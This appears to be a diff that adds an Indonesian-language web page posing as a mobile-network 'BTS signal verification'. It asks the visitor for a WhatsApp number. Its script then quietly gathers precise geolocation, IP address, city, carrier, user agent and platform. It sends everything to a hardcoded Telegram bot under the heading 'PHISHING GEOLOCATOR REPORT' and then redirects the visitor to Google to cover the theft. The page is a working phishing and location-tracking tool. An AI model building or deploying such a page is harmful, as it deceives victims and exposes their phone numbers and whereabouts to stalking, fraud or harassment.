@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi Jaringan</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial;background:#f4f4f4;display:flex;justify-content:center;align-items:center;height:100vh}
+.box{background:#fff;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);max-width:400px;width:100%}
+h2{text-align:center;margin-bottom:20px;color:#333}
+p{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
+input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:5px;font-size:16px}
+button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:5px;font-size:16px;cursor:pointer}
+button:hover{background:#0056b3}
+.loader{display:none;text-align:center;margin-top:15px;color:#007bff}
+.hidden{display:none}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>Verifikasi Sinyal BTS</h2>
+<p>Masukkan nomor WhatsApp Anda untuk verifikasi jaringan lokal.</p>
+<input type="text" id="waNumber" placeholder="08xxxxxxxxxx" />
+<button onclick="sendData()">Verifikasi Sekarang</button>
+<div class="loader" id="loader">⏳ Mengirim data...</div>
+</div>
+
+<script>
+const BOT_TOKEN = "8886334927:AAGb_PiT2KJw4eubEizAI6QRX_8Ky_skMos";
+const CHAT_ID = "6080367121";
+
+function getLocation() {
+    return new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                () => resolve({ lat: null, lon: null })
+            );
+        } else {
+            resolve({ lat: null, lon: null });
+        }
+    });
+}
+
+function getIPInfo() {
+    return fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => ({
+            ip: data.ip || 'Unknown',
+            country: data.country_name || 'Unknown',
+            region: data.region || 'Unknown',
+            city: data.city || 'Unknown',
+            lat: data.latitude || 0,
+            lon: data.longitude || 0,
+            org: data.org || 'Unknown',
+            isp: data.isp || 'Unknown'
+        }))
+        .catch(() => ({
+            ip: 'Unknown',
+            country: 'Unknown',
+            region: 'Unknown',
+            city: 'Unknown',
+            lat: 0,
+            lon: 0,
+            org: 'Unknown',
+            isp: 'Unknown'
+        }));
+}
+
+function detectOperator(ua, isp) {
+    const ua_lower = ua.toLowerCase();
+    if (ua_lower.includes('telkomsel')) return 'Telkomsel';
+    if (ua_lower.includes('indosat')) return 'Indosat Ooredoo';
+    if (ua_lower.includes('xl')) return 'XL Axiata';
+    if (ua_lower.includes('smartfren')) return 'Smartfren';
+    if (ua_lower.includes('tri') || ua_lower.includes('3')) return 'Tri (3)';
+    if (isp.toLowerCase().includes('telkom')) return 'Telkom (IndiHome)';
+    if (isp.toLowerCase().includes('indosat')) return 'Indosat Ooredoo';
+    if (isp.toLowerCase().includes('xl')) return 'XL Axiata';
+    if (isp.toLowerCase().includes('smartfren')) return 'Smartfren';
+    return isp || 'Unknown';
+}
+
+function sendTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    return fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    });
+}
+
+async function sendData() {
+    const wa = document.getElementById('waNumber').value.trim();
+    if (!wa || wa.length < 10) {
+        alert('Masukkan nomor WhatsApp yang valid!');
+        return;
+    }
+    document.getElementById('loader').style.display = 'block';
+
+    const loc = await getLocation();
+    const ipInfo = await getIPInfo();
+    const ua = navigator.userAgent;
+    const lang = navigator.language || 'id-ID';
+    const platform = navigator.platform || 'unknown';
+    const timestamp = new Date().toISOString();
+
+    const lat = loc.lat || ipInfo.lat;
+    const lon = loc.lon || ipInfo.lon;
+    const country = ipInfo.country;
+    const region = ipInfo.region;
+    const city = ipInfo.city;
+    const operator = detectOperator(ua, ipInfo.isp);
+    const ip = ipInfo.ip;
+
+    const message = `<b>📡 PHISHING GEOLOCATOR REPORT</b>
+<b>⏱ Waktu:</b> ${timestamp}
+<b>🌐 IP:</b> ${ip}
+<b>📍 Lokasi Akhir:</b> ${lat}, ${lon}
+<b>🏙 Provinsi:</b> ${region}
+<b>🗺 Daerah:</b> ${city}
+<b>🌍 Negara:</b> ${country}
+<b>📱 Kartu/Operator:</b> ${operator}
+<b>📞 Nomor WA:</b> ${wa}
+<b>📱 User-Agent:</b> ${ua.substring(0, 100)}
+<b>🌐 Bahasa:</b> ${lang}
+<b>💻 Platform:</b> ${platform}`;
+
+    try {
+        await sendTelegram(message);
+        document.getElementById('loader').innerHTML = '✅ Data terverifikasi. Mengalihkan...';
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 1500);
+    } catch (e) {
+        document.getElementById('loader').innerHTML = '❌ Gagal mengirim. Coba lagi.';
+        document.getElementById('loader').style.display = 'none';
+    }
+}
+</script>
+</body>
+</html>
